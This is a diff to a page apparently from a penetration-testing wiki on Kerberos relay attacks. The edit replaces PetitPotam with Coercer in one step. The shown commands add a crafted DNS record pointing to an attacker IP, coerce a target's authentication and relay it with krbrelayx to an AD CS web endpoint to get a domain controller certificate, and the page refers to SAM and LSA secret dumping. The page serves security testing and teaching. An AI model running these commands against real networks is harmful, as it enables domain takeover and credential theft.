@@ -105,14 +105,14 @@ It is therefore necessary to restrict the content of the `CREDENTIAL_TARGET_INFO
 dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp
 ```
 
-2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
+2. Then, trigger an authentication coerce (with [Coercer](https://github.com/p0dalirius/Coercer)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
 
 ```bash
 # In a first terminal, krbrelayx waiting for an authentication to relay
 krbrelayx.py -t "http://$CA/certsrv/certfnsh.asp" --adcs --template DomainController -v "$RELAYED_TARGET_SAMNAME"
 
 # In a second terminal, coerce the victim authentication to the DNS record
-Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
+coercer coerce -t $TARGET_IP -l "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
 ```
 
 In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md):
